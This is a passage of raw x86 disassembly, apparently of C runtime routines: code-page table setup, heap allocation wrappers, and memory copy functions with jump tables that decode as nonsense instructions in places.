  423fe9:	lea    eax,[ebp-0x18]
  423fec:	push   eax
  423fed:	push   DWORD PTR ds:0x45d024
  423ff3:	call   DWORD PTR ds:0x4280a0
  423ff9:	cmp    eax,0x1
  423ffc:	mov    esi,0x100
  424001:	jne    0x424114
  424007:	xor    eax,eax
  424009:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424010:	inc    eax
  424011:	cmp    eax,esi
  424013:	jb     0x424009
  424015:	mov    al,BYTE PTR [ebp-0x12]
  424018:	test   al,al
  42401a:	mov    BYTE PTR [ebp-0x118],0x20
  424021:	je     0x424059
  424023:	push   ebx
  424024:	lea    edx,[ebp-0x11]
  424027:	push   edi
  424028:	movzx  ecx,BYTE PTR [edx]
  42402b:	movzx  eax,al
  42402e:	cmp    eax,ecx
  424030:	ja     0x42404f
  424032:	sub    ecx,eax
  424034:	inc    ecx
  424035:	mov    ebx,ecx
  424037:	shr    ecx,0x2
  42403a:	lea    edi,[ebp+eax*1-0x118]
  424041:	mov    eax,0x20202020
  424046:	rep stos DWORD PTR es:[edi],eax
  424048:	mov    ecx,ebx
  42404a:	and    ecx,0x3
  42404d:	rep stos BYTE PTR es:[edi],al
  42404f:	inc    edx
  424050:	mov    al,BYTE PTR [edx]
  424052:	inc    edx
  424053:	test   al,al
  424055:	jne    0x424028
  424057:	pop    edi
  424058:	pop    ebx
  424059:	push   0x0
  42405b:	push   DWORD PTR ds:0x45cf14
  424061:	lea    eax,[ebp-0x518]
  424067:	push   DWORD PTR ds:0x45d024
  42406d:	push   eax
  42406e:	push   esi
  42406f:	lea    eax,[ebp-0x118]
  424075:	push   eax
  424076:	push   0x1
  424078:	call   0x425f88
  42407d:	push   0x0
  42407f:	push   DWORD PTR ds:0x45d024
  424085:	lea    eax,[ebp-0x218]
  42408b:	push   esi
  42408c:	push   eax
  42408d:	push   esi
  42408e:	lea    eax,[ebp-0x118]
  424094:	push   eax
  424095:	push   esi
  424096:	push   DWORD PTR ds:0x45cf14
  42409c:	call   0x425bcc
  4240a1:	push   0x0
  4240a3:	push   DWORD PTR ds:0x45d024
  4240a9:	lea    eax,[ebp-0x318]
  4240af:	push   esi
  4240b0:	push   eax
  4240b1:	push   esi
  4240b2:	lea    eax,[ebp-0x118]
  4240b8:	push   eax
  4240b9:	push   0x200
  4240be:	push   DWORD PTR ds:0x45cf14
  4240c4:	call   0x425bcc
  4240c9:	add    esp,0x5c
  4240cc:	xor    eax,eax
  4240ce:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4240d6:	test   cl,0x1
  4240d9:	je     0x4240f1
  4240db:	or     BYTE PTR [eax+0x45cf21],0x10
  4240e2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4240e9:	mov    BYTE PTR [eax+0x45d040],cl
  4240ef:	jmp    0x42410d
  4240f1:	test   cl,0x2
  4240f4:	je     0x424106
  4240f6:	or     BYTE PTR [eax+0x45cf21],0x20
  4240fd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424104:	jmp    0x4240e9
  424106:	and    BYTE PTR [eax+0x45d040],0x0
  42410d:	inc    eax
  42410e:	cmp    eax,esi
  424110:	jb     0x4240ce
  424112:	jmp    0x424158
  424114:	xor    eax,eax
  424116:	cmp    eax,0x41
  424119:	jb     0x424134
  42411b:	cmp    eax,0x5a
  42411e:	ja     0x424134
  424120:	or     BYTE PTR [eax+0x45cf21],0x10
  424127:	mov    cl,al
  424129:	add    cl,0x20
  42412c:	mov    BYTE PTR [eax+0x45d040],cl
  424132:	jmp    0x424153
  424134:	cmp    eax,0x61
  424137:	jb     0x42414c
  424139:	cmp    eax,0x7a
  42413c:	ja     0x42414c
  42413e:	or     BYTE PTR [eax+0x45cf21],0x20
  424145:	mov    cl,al
  424147:	sub    cl,0x20
  42414a:	jmp    0x42412c
  42414c:	and    BYTE PTR [eax+0x45d040],0x0
  424153:	inc    eax
  424154:	cmp    eax,esi
  424156:	jb     0x424116
  424158:	mov    ecx,DWORD PTR [ebp-0x4]
  42415b:	xor    ecx,DWORD PTR [ebp+0x4]
  42415e:	pop    esi
  42415f:	call   0x423f2c
  424164:	leave  
  424165:	ret    
  424166:	push   ebp
  424167:	mov    ebp,esp
  424169:	sub    esp,0x1c
  42416c:	mov    eax,ds:0x45c430
  424171:	xor    eax,DWORD PTR [ebp+0x4]
  424174:	push   ebx
  424175:	push   esi
  424176:	mov    esi,DWORD PTR [ebp+0x8]
  424179:	xor    ebx,ebx
  42417b:	cmp    esi,ebx
  42417d:	mov    DWORD PTR [ebp-0x4],eax
  424180:	push   edi
  424181:	je     0x4242db
  424187:	xor    edx,edx
  424189:	xor    eax,eax
  42418b:	cmp    DWORD PTR [eax+0x45c440],esi
  424191:	je     0x4241f8
  424193:	add    eax,0x30
  424196:	inc    edx
  424197:	cmp    eax,0xf0
  42419c:	jb     0x42418b
  42419e:	lea    eax,[ebp-0x1c]
  4241a1:	push   eax
  4241a2:	push   esi
  4241a3:	call   DWORD PTR ds:0x4280a0
  4241a9:	cmp    eax,0x1
  4241ac:	jne    0x4242d3
  4241b2:	push   0x40
  4241b4:	xor    eax,eax
  4241b6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4241ba:	pop    ecx
  4241bb:	mov    edi,0x45cf20
  4241c0:	rep stos DWORD PTR es:[edi],eax
  4241c2:	stos   BYTE PTR es:[edi],al
  4241c3:	mov    DWORD PTR ds:0x45d024,esi
  4241c9:	mov    DWORD PTR ds:0x45cf14,ebx
  4241cf:	jbe    0x4242c1
  4241d5:	cmp    BYTE PTR [ebp-0x16],0x0
  4241d9:	je     0x424299
  4241df:	lea    ecx,[ebp-0x15]
  4241e2:	mov    dl,BYTE PTR [ecx]
  4241e4:	test   dl,dl
  4241e6:	je     0x424299
  4241ec:	movzx  eax,BYTE PTR [ecx-0x1]
  4241f0:	movzx  edx,dl
  4241f3:	jmp    0x424289
  4241f8:	push   0x40
  4241fa:	xor    eax,eax
  4241fc:	pop    ecx
  4241fd:	mov    edi,0x45cf20
  424202:	rep stos DWORD PTR es:[edi],eax
  424204:	lea    ecx,[edx+edx*2]
  424207:	shl    ecx,0x4
  42420a:	mov    DWORD PTR [ebp-0x8],ebx
  42420d:	stos   BYTE PTR es:[edi],al
  42420e:	lea    ebx,[ecx+0x45c450]
  424214:	mov    al,BYTE PTR [ebx]
  424216:	mov    esi,ebx
  424218:	jmp    0x424243
  42421a:	mov    dl,BYTE PTR [esi+0x1]
  42421d:	test   dl,dl
  42421f:	je     0x424247
  424221:	movzx  eax,al
  424224:	movzx  edi,dl
  424227:	cmp    eax,edi
  424229:	ja     0x42423f
  42422b:	mov    edx,DWORD PTR [ebp-0x8]
  42422e:	mov    dl,BYTE PTR [edx+0x45c438]
  424234:	or     BYTE PTR [eax+0x45cf21],dl
  42423a:	inc    eax
  42423b:	cmp    eax,edi
  42423d:	jbe    0x424234
  42423f:	inc    esi
  424240:	inc    esi
  424241:	mov    al,BYTE PTR [esi]
  424243:	test   al,al
  424245:	jne    0x42421a
  424247:	inc    DWORD PTR [ebp-0x8]
  42424a:	add    ebx,0x8
  42424d:	cmp    DWORD PTR [ebp-0x8],0x4
  424251:	jb     0x424214
  424253:	mov    eax,DWORD PTR [ebp+0x8]
  424256:	mov    ds:0x45d024,eax
  42425b:	mov    DWORD PTR ds:0x45cf1c,0x1
  424265:	call   0x423f7c
  42426a:	lea    ecx,[ecx+0x45c444]
  424270:	mov    esi,ecx
  424272:	mov    edi,0x45d030
  424277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424279:	mov    ds:0x45cf14,eax
  42427e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42427f:	jmp    0x4242e0
  424281:	or     BYTE PTR [eax+0x45cf21],0x4
  424288:	inc    eax
  424289:	cmp    eax,edx
  42428b:	jbe    0x424281
  42428d:	inc    ecx
  42428e:	inc    ecx
  42428f:	cmp    BYTE PTR [ecx-0x1],0x0
  424293:	jne    0x4241e2
  424299:	xor    ecx,ecx
  42429b:	inc    ecx
  42429c:	mov    eax,ecx
  42429e:	or     BYTE PTR [eax+0x45cf21],0x8
  4242a5:	inc    eax
  4242a6:	cmp    eax,0xff
  4242ab:	jb     0x42429e
  4242ad:	mov    eax,esi
  4242af:	call   0x423f7c
  4242b4:	mov    ds:0x45cf14,eax
  4242b9:	mov    DWORD PTR ds:0x45cf1c,ecx
  4242bf:	jmp    0x4242c7
  4242c1:	mov    DWORD PTR ds:0x45cf1c,ebx
  4242c7:	xor    eax,eax
  4242c9:	mov    edi,0x45d030
  4242ce:	stos   DWORD PTR es:[edi],eax
  4242cf:	stos   DWORD PTR es:[edi],eax
  4242d0:	stos   DWORD PTR es:[edi],eax
  4242d1:	jmp    0x4242e0
  4242d3:	cmp    DWORD PTR ds:0x45cd84,ebx
  4242d9:	je     0x4242e9
  4242db:	call   0x423fab
  4242e0:	call   0x423fd4
  4242e5:	xor    eax,eax
  4242e7:	jmp    0x4242ec
  4242e9:	or     eax,0xffffffff
  4242ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4242ef:	xor    ecx,DWORD PTR [ebp+0x4]
  4242f2:	pop    edi
  4242f3:	pop    esi
  4242f4:	pop    ebx
  4242f5:	call   0x423f2c
  4242fa:	leave  
  4242fb:	ret    
  4242fc:	push   0x14
  4242fe:	push   0x428550
  424303:	call   0x423858
  424308:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42430c:	push   0xd
  42430e:	call   0x423a1f
  424313:	pop    ecx
  424314:	xor    edi,edi
  424316:	mov    DWORD PTR [ebp-0x4],edi
  424319:	mov    DWORD PTR ds:0x45cd84,edi
  42431f:	mov    eax,DWORD PTR [ebp+0x8]
  424322:	cmp    eax,0xfffffffe
  424325:	jne    0x424339
  424327:	mov    DWORD PTR ds:0x45cd84,0x1
  424331:	call   DWORD PTR ds:0x42809c
  424337:	jmp    0x424364
  424339:	cmp    eax,0xfffffffd
  42433c:	jne    0x424350
  42433e:	mov    DWORD PTR ds:0x45cd84,0x1
  424348:	call   DWORD PTR ds:0x428098
  42434e:	jmp    0x424364
  424350:	cmp    eax,0xfffffffc
  424353:	jne    0x424364
  424355:	mov    DWORD PTR ds:0x45cd84,0x1
  42435f:	mov    eax,ds:0x45cdb4
  424364:	mov    DWORD PTR [ebp+0x8],eax
  424367:	cmp    eax,DWORD PTR ds:0x45d024
  42436d:	je     0x42442e
  424373:	mov    esi,DWORD PTR ds:0x45cf18
  424379:	mov    DWORD PTR [ebp-0x20],esi
  42437c:	cmp    esi,edi
  42437e:	je     0x424384
  424380:	cmp    DWORD PTR [esi],edi
  424382:	je     0x424394
  424384:	push   0x220
  424389:	call   0x424582
  42438e:	pop    ecx
  42438f:	mov    esi,eax
  424391:	mov    DWORD PTR [ebp-0x20],esi
  424394:	cmp    esi,edi
  424396:	je     0x424417
  424398:	push   DWORD PTR [ebp+0x8]
  42439b:	call   0x424166
  4243a0:	pop    ecx
  4243a1:	mov    DWORD PTR [ebp-0x1c],eax
  4243a4:	cmp    eax,edi
  4243a6:	jne    0x424417
  4243a8:	mov    DWORD PTR [esi],edi
  4243aa:	mov    eax,ds:0x45d024
  4243af:	mov    DWORD PTR [esi+0x4],eax
  4243b2:	mov    eax,ds:0x45cf1c
  4243b7:	mov    DWORD PTR [esi+0x8],eax
  4243ba:	mov    eax,ds:0x45cf14
  4243bf:	mov    DWORD PTR [esi+0xc],eax
  4243c2:	xor    eax,eax
  4243c4:	mov    DWORD PTR [ebp-0x24],eax
  4243c7:	cmp    eax,0x5
  4243ca:	jge    0x4243dc
  4243cc:	mov    cx,WORD PTR [eax*2+0x45d030]
  4243d4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4243d9:	inc    eax
  4243da:	jmp    0x4243c4
  4243dc:	xor    eax,eax
  4243de:	mov    DWORD PTR [ebp-0x24],eax
  4243e1:	cmp    eax,0x101
  4243e6:	jge    0x4243f5
  4243e8:	mov    cl,BYTE PTR [eax+0x45cf20]
  4243ee:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4243f2:	inc    eax
  4243f3:	jmp    0x4243de
  4243f5:	xor    eax,eax
  4243f7:	mov    DWORD PTR [ebp-0x24],eax
  4243fa:	cmp    eax,0x100
  4243ff:	jge    0x424411
  424401:	mov    cl,BYTE PTR [eax+0x45d040]
  424407:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42440e:	inc    eax
  42440f:	jmp    0x4243f7
  424411:	mov    DWORD PTR ds:0x45cf18,esi
  424417:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42441b:	jne    0x424431
  42441d:	cmp    esi,DWORD PTR ds:0x45cf18
  424423:	je     0x424431
  424425:	push   esi
  424426:	call   0x42446a
  42442b:	pop    ecx
  42442c:	jmp    0x424431
  42442e:	mov    DWORD PTR [ebp-0x1c],edi
  424431:	or     DWORD PTR [ebp-0x4],0xffffffff
  424435:	call   0x424443
  42443a:	mov    eax,DWORD PTR [ebp-0x1c]
  42443d:	call   0x423893
  424442:	ret    
  424443:	push   0xd
  424445:	call   0x42398b
  42444a:	pop    ecx
  42444b:	ret    
  42444c:	cmp    DWORD PTR ds:0x45d26c,0x0
  424453:	jne    0x424467
  424455:	push   0xfffffffd
  424457:	call   0x4242fc
  42445c:	pop    ecx
  42445d:	mov    DWORD PTR ds:0x45d26c,0x1
  424467:	xor    eax,eax
  424469:	ret    
  42446a:	push   0xc
  42446c:	push   0x428560
  424471:	call   0x423858
  424476:	mov    esi,DWORD PTR [ebp+0x8]
  424479:	test   esi,esi
  42447b:	je     0x4244d5
  42447d:	cmp    DWORD PTR ds:0x45d144,0x3
  424484:	jne    0x4244c6
  424486:	push   0x4
  424488:	call   0x423a1f
  42448d:	pop    ecx
  42448e:	and    DWORD PTR [ebp-0x4],0x0
  424492:	push   esi
  424493:	call   0x424c42
  424498:	pop    ecx
  424499:	mov    DWORD PTR [ebp-0x1c],eax
  42449c:	test   eax,eax
  42449e:	je     0x4244a9
  4244a0:	push   esi
  4244a1:	push   eax
  4244a2:	call   0x424c6d
  4244a7:	pop    ecx
  4244a8:	pop    ecx
  4244a9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244ad:	call   0x4244bd
  4244b2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4244b6:	jne    0x4244d5
  4244b8:	push   DWORD PTR [ebp+0x8]
  4244bb:	jmp    0x4244c7
  4244bd:	push   0x4
  4244bf:	call   0x42398b
  4244c4:	pop    ecx
  4244c5:	ret    
  4244c6:	push   esi
  4244c7:	push   0x0
  4244c9:	push   DWORD PTR ds:0x45d140
  4244cf:	call   DWORD PTR ds:0x428088
  4244d5:	call   0x423893
  4244da:	ret    
  4244db:	push   0xc
  4244dd:	push   0x428570
  4244e2:	call   0x423858
  4244e7:	mov    esi,DWORD PTR [ebp+0x8]
  4244ea:	cmp    DWORD PTR ds:0x45d144,0x3
  4244f1:	jne    0x424521
  4244f3:	cmp    esi,DWORD PTR ds:0x45cf04
  4244f9:	ja     0x424521
  4244fb:	push   0x4
  4244fd:	call   0x423a1f
  424502:	pop    ecx
  424503:	and    DWORD PTR [ebp-0x4],0x0
  424507:	push   esi
  424508:	call   0x425421
  42450d:	pop    ecx
  42450e:	mov    DWORD PTR [ebp-0x1c],eax
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x42454d
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	test   eax,eax
  42451f:	jne    0x424544
  424521:	test   esi,esi
  424523:	jne    0x424526
  424525:	inc    esi
  424526:	cmp    DWORD PTR ds:0x45d144,0x1
  42452d:	je     0x424535
  42452f:	add    esi,0xf
  424532:	and    esi,0xfffffff0
  424535:	push   esi
  424536:	push   0x0
  424538:	push   DWORD PTR ds:0x45d140
  42453e:	call   DWORD PTR ds:0x4280a4
  424544:	call   0x423893
  424549:	ret    
  42454a:	mov    esi,DWORD PTR [ebp+0x8]
  42454d:	push   0x4
  42454f:	call   0x42398b
  424554:	pop    ecx
  424555:	ret    
  424556:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42455b:	ja     0x42457f
  42455d:	push   DWORD PTR [esp+0x4]
  424561:	call   0x4244db
  424566:	test   eax,eax
  424568:	pop    ecx
  424569:	jne    0x424581
  42456b:	cmp    DWORD PTR [esp+0x8],eax
  42456f:	je     0x424581
  424571:	push   DWORD PTR [esp+0x4]
  424575:	call   0x426142
  42457a:	test   eax,eax
  42457c:	pop    ecx
  42457d:	jne    0x42455d
  42457f:	xor    eax,eax
  424581:	ret    
  424582:	push   DWORD PTR ds:0x45cdc8
  424588:	push   DWORD PTR [esp+0x8]
  42458c:	call   0x424556
  424591:	pop    ecx
  424592:	pop    ecx
  424593:	ret    
  424594:	int3   
  424595:	int3   
  424596:	int3   
  424597:	int3   
  424598:	int3   
  424599:	int3   
  42459a:	int3   
  42459b:	int3   
  42459c:	int3   
  42459d:	int3   
  42459e:	int3   
  42459f:	int3   
  4245a0:	push   ebp
  4245a1:	mov    ebp,esp
  4245a3:	push   edi
  4245a4:	push   esi
  4245a5:	mov    esi,DWORD PTR [ebp+0xc]
  4245a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245ab:	mov    edi,DWORD PTR [ebp+0x8]
  4245ae:	mov    eax,ecx
  4245b0:	mov    edx,ecx
  4245b2:	add    eax,esi
  4245b4:	cmp    edi,esi
  4245b6:	jbe    0x4245c0
  4245b8:	cmp    edi,eax
  4245ba:	jb     0x42473c
  4245c0:	test   edi,0x3
  4245c6:	jne    0x4245dc
  4245c8:	shr    ecx,0x2
  4245cb:	and    edx,0x3
  4245ce:	cmp    ecx,0x8
  4245d1:	jb     0x4245fc
  4245d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d5:	jmp    DWORD PTR [edx*4+0x4246ec]
  4245dc:	mov    eax,edi
  4245de:	mov    edx,0x3
  4245e3:	sub    ecx,0x4
  4245e6:	jb     0x4245f4
  4245e8:	and    eax,0x3
  4245eb:	add    ecx,eax
  4245ed:	jmp    DWORD PTR [eax*4+0x424600]
  4245f4:	jmp    DWORD PTR [ecx*4+0x4246fc]
  4245fb:	nop
  4245fc:	jmp    DWORD PTR [ecx*4+0x424680]
  424603:	nop
  424604:	adc    BYTE PTR [esi+0x42],al
  424607:	add    BYTE PTR [esi+eax*2],bh
  42460a:	inc    edx
  42460b:	add    BYTE PTR [eax+0x46],ah
  42460e:	inc    edx
  42460f:	add    BYTE PTR [ebx],ah
  424611:	ror    DWORD PTR [edx-0x75f877fa],1
  424617:	inc    esi
  424618:	add    DWORD PTR [eax+0x468a0147],ecx
  42461e:	add    al,cl
  424620:	jmp    0x289ce27
  424625:	add    esi,0x3
  424628:	add    edi,0x3
  42462b:	cmp    ecx,0x8
  42462e:	jb     0x4245fc
  424630:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424632:	jmp    DWORD PTR [edx*4+0x4246ec]
  424639:	lea    ecx,[ecx+0x0]
  42463c:	and    edx,ecx
  42463e:	mov    al,BYTE PTR [esi]
  424640:	mov    BYTE PTR [edi],al
  424642:	mov    al,BYTE PTR [esi+0x1]
  424645:	shr    ecx,0x2
  424648:	mov    BYTE PTR [edi+0x1],al
  42464b:	add    esi,0x2
  42464e:	add    edi,0x2
  424651:	cmp    ecx,0x8
  424654:	jb     0x4245fc
  424656:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424658:	jmp    DWORD PTR [edx*4+0x4246ec]
  42465f:	nop
  424660:	and    edx,ecx
  424662:	mov    al,BYTE PTR [esi]
  424664:	mov    BYTE PTR [edi],al
  424666:	add    esi,0x1
  424669:	shr    ecx,0x2
  42466c:	add    edi,0x1
  42466f:	cmp    ecx,0x8
  424672:	jb     0x4245fc
  424674:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424676:	jmp    DWORD PTR [edx*4+0x4246ec]
  42467d:	lea    ecx,[ecx+0x0]
  424680:	jecxz  0x4246c8
  424682:	inc    edx
  424683:	add    al,dl
  424685:	inc    esi
  424686:	inc    edx
  424687:	add    al,cl
  424689:	inc    esi
  42468a:	inc    edx
  42468b:	add    al,al
  42468d:	inc    esi
  42468e:	inc    edx
  42468f:	add    BYTE PTR [eax-0x4fffbdba],bh
  424695:	inc    esi
  424696:	inc    edx
  424697:	add    BYTE PTR [eax-0x5fffbdba],ch
  42469d:	inc    esi
  42469e:	inc    edx
  42469f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246a5:	inc    esp
  4246a6:	(bad)  
  4246a7:	in     al,0x8b
  4246a9:	inc    esp
  4246aa:	mov    gs,eax
  4246ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4246b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4246b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4246b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4246bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4246c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4246c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4246c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4246cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4246d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4246d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4246d8:	lea    eax,[ecx*4+0x0]
  4246df:	add    esi,eax
  4246e1:	add    edi,eax
  4246e3:	jmp    DWORD PTR [edx*4+0x4246ec]
  4246ea:	mov    edi,edi
  4246ec:	cld    
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [edi+eax*2],al
  4246f2:	inc    edx
  4246f3:	add    BYTE PTR [eax],dl
  4246f5:	inc    edi
  4246f6:	inc    edx
  4246f7:	add    BYTE PTR [edi+eax*2],ah
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424701:	leave  
  424702:	ret    
  424703:	nop
  424704:	mov    al,BYTE PTR [esi]
  424706:	mov    BYTE PTR [edi],al
  424708:	mov    eax,DWORD PTR [ebp+0x8]
  42470b:	pop    esi
  42470c:	pop    edi
  42470d:	leave  
  42470e:	ret    
  42470f:	nop
  424710:	mov    al,BYTE PTR [esi]
  424712:	mov    BYTE PTR [edi],al
  424714:	mov    al,BYTE PTR [esi+0x1]
  424717:	mov    BYTE PTR [edi+0x1],al
  42471a:	mov    eax,DWORD PTR [ebp+0x8]
  42471d:	pop    esi
  42471e:	pop    edi
  42471f:	leave  
  424720:	ret    
  424721:	lea    ecx,[ecx+0x0]
  424724:	mov    al,BYTE PTR [esi]
  424726:	mov    BYTE PTR [edi],al
  424728:	mov    al,BYTE PTR [esi+0x1]
  42472b:	mov    BYTE PTR [edi+0x1],al
  42472e:	mov    al,BYTE PTR [esi+0x2]
  424731:	mov    BYTE PTR [edi+0x2],al
  424734:	mov    eax,DWORD PTR [ebp+0x8]
  424737:	pop    esi
  424738:	pop    edi
  424739:	leave  
  42473a:	ret    
  42473b:	nop
  42473c:	lea    esi,[ecx+esi*1-0x4]
  424740:	lea    edi,[ecx+edi*1-0x4]
  424744:	test   edi,0x3
  42474a:	jne    0x424770
  42474c:	shr    ecx,0x2
  42474f:	and    edx,0x3
  424752:	cmp    ecx,0x8
  424755:	jb     0x424764
  424757:	std    
  424758:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475a:	cld    
  42475b:	jmp    DWORD PTR [edx*4+0x424888]
  424762:	mov    edi,edi
  424764:	neg    ecx
  424766:	jmp    DWORD PTR [ecx*4+0x424838]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	mov    eax,edi
  424772:	mov    edx,0x3
  424777:	cmp    ecx,0x4
  42477a:	jb     0x424788
  42477c:	and    eax,0x3
  42477f:	sub    ecx,eax
  424781:	jmp    DWORD PTR [eax*4+0x42478c]
  424788:	jmp    DWORD PTR [ecx*4+0x424888]
  42478f:	nop
  424790:	pushf  
  424791:	inc    edi
  424792:	inc    edx
  424793:	add    al,al
  424795:	inc    edi
  424796:	inc    edx
  424797:	add    al,ch
  424799:	inc    edi
  42479a:	inc    edx
  42479b:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247a1:	mov    BYTE PTR [edi+0x3],al
  4247a4:	sub    esi,0x1
  4247a7:	shr    ecx,0x2
  4247aa:	sub    edi,0x1
  4247ad:	cmp    ecx,0x8
  4247b0:	jb     0x424764
  4247b2:	std    
  4247b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b5:	cld    
  4247b6:	jmp    DWORD PTR [edx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    al,BYTE PTR [esi+0x3]
  4247c3:	and    edx,ecx
  4247c5:	mov    BYTE PTR [edi+0x3],al
  4247c8:	mov    al,BYTE PTR [esi+0x2]
  4247cb:	shr    ecx,0x2
  4247ce:	mov    BYTE PTR [edi+0x2],al
  4247d1:	sub    esi,0x2
  4247d4:	sub    edi,0x2
  4247d7:	cmp    ecx,0x8
  4247da:	jb     0x424764
  4247dc:	std    
  4247dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247df:	cld    
  4247e0:	jmp    DWORD PTR [edx*4+0x424888]
  4247e7:	nop
  4247e8:	mov    al,BYTE PTR [esi+0x3]
  4247eb:	and    edx,ecx
  4247ed:	mov    BYTE PTR [edi+0x3],al
  4247f0:	mov    al,BYTE PTR [esi+0x2]
  4247f3:	mov    BYTE PTR [edi+0x2],al
  4247f6:	mov    al,BYTE PTR [esi+0x1]
  4247f9:	shr    ecx,0x2
  4247fc:	mov    BYTE PTR [edi+0x1],al
  4247ff:	sub    esi,0x3
  424802:	sub    edi,0x3
  424805:	cmp    ecx,0x8
  424808:	jb     0x424764
  42480e:	std    
  42480f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424811:	cld    
  424812:	jmp    DWORD PTR [edx*4+0x424888]
  424819:	lea    ecx,[ecx+0x0]
  42481c:	cmp    al,0x48
  42481e:	inc    edx
  42481f:	add    BYTE PTR [eax+ecx*2+0x42],al
  424823:	add    BYTE PTR [eax+ecx*2+0x42],cl
  424827:	add    BYTE PTR [eax+ecx*2+0x42],dl
  42482b:	add    BYTE PTR [eax+ecx*2+0x42],bl
  42482f:	add    BYTE PTR [eax+ecx*2+0x42],ah
  424833:	add    BYTE PTR [eax+ecx*2+0x42],ch
  424837:	add    BYTE PTR [edi+0x48],bh
  42483a:	inc    edx
  42483b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424841:	inc    esp
  424842:	(bad)  
  424843:	sbb    al,0x8b
  424845:	inc    esp
  424846:	mov    ds,WORD PTR [eax]
  424848:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42484c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424850:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424854:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424858:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42485c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424860:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424864:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424868:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42486c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424870:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424874:	lea    eax,[ecx*4+0x0]
  42487b:	add    esi,eax
  42487d:	add    edi,eax
  42487f:	jmp    DWORD PTR [edx*4+0x424888]
  424886:	mov    edi,edi
  424888:	cwde   
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [eax-0x4fffbdb8],ah
  424891:	dec    eax
  424892:	inc    edx
  424893:	add    ah,al
  424895:	dec    eax
  424896:	inc    edx
  424897:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42489d:	leave  
  42489e:	ret    
  42489f:	nop
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	mov    BYTE PTR [edi+0x3],al
  4248a6:	mov    eax,DWORD PTR [ebp+0x8]
  4248a9:	pop    esi
  4248aa:	pop    edi
  4248ab:	leave  
  4248ac:	ret    
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	mov    BYTE PTR [edi+0x3],al
  4248b6:	mov    al,BYTE PTR [esi+0x2]
  4248b9:	mov    BYTE PTR [edi+0x2],al
  4248bc:	mov    eax,DWORD PTR [ebp+0x8]
  4248bf:	pop    esi
  4248c0:	pop    edi
  4248c1:	leave  
  4248c2:	ret    
  4248c3:	nop
  4248c4:	mov    al,BYTE PTR [esi+0x3]
  4248c7:	mov    BYTE PTR [edi+0x3],al
  4248ca:	mov    al,BYTE PTR [esi+0x2]
  4248cd:	mov    BYTE PTR [edi+0x2],al
  4248d0:	mov    al,BYTE PTR [esi+0x1]
  4248d3:	mov    BYTE PTR [edi+0x1],al
  4248d6:	mov    eax,DWORD PTR [ebp+0x8]
  4248d9:	pop    esi
  4248da:	pop    edi
  4248db:	leave  
  4248dc:	ret    
  4248dd:	push   DWORD PTR [esp+0x4]
  4248e1:	call   DWORD PTR ds:0x4280a8
  4248e7:	xor    eax,eax
  4248e9:	inc    eax
  4248ea:	ret    0x8
  4248ed:	push   0x10
  4248ef:	push   0x4285b8
  4248f4:	call   0x423858
  4248f9:	mov    eax,ds:0x45cd88
  4248fe:	test   eax,eax
  424900:	jne    0x424939
  424902:	cmp    DWORD PTR ds:0x45cac4,0x1
  424909:	je     0x42492f
